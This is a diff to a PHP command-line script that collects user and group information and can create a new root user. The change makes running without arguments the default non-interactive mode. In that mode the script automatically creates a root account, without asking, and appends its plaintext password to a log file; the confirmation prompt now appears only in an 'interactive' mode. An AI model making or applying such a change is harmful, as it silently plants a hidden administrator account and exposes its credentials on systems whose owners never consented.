@@ -22,20 +22,18 @@ $output .= "Groups: $group_info\n";
 $output .= "------------------------\n";
 
 // Check if a command-line parameter is provided
-if (isset($argv[1]) && $argv[1] === 'log') {
+$interactive_mode = isset($argv[1]) && $argv[1] === 'interactive';
+
+if (!$interactive_mode) {
     // Log the information to a file
     $log_file = 'privilege_info.log';
     file_put_contents($log_file, $output, FILE_APPEND | LOCK_EX);
+    $elevate_privileges = true;
 } else {
     // Print the information to the console
     echo $output;
-}
 
-// Prompt the user to elevate privileges or automatically elevate if logging
-$elevate_privileges = false;
-if (isset($argv[1]) && $argv[1] === 'log') {
-    $elevate_privileges = true;
-} else {
+    // Prompt the user to elevate privileges
     echo "Do you want to elevate privileges and create a new root user? (yes/no): ";
     $answer = trim(fgets(STDIN));
     $elevate_privileges = (strtolower($answer) === 'yes');
@@ -59,13 +57,13 @@ if ($elevate_privileges) {
     $output = "New root user '$new_username' created with password: $password\n";
     $output .= "------------------------\n";
 
-    // Log or print the new root user creation based on the command-line parameter
-    if (isset($argv[1]) && $argv[1] === 'log') {
+    // Log or print the new root user creation based on the interactive mode
+    if (!$interactive_mode) {
         file_put_contents($log_file, $output, FILE_APPEND | LOCK_EX);
     } else {
         echo $output;
     }
-} elseif (!isset($argv[1]) || $argv[1] !== 'log') {
+} elseif ($interactive_mode) {
     echo "Privilege elevation canceled.\n";
 }
 ?>
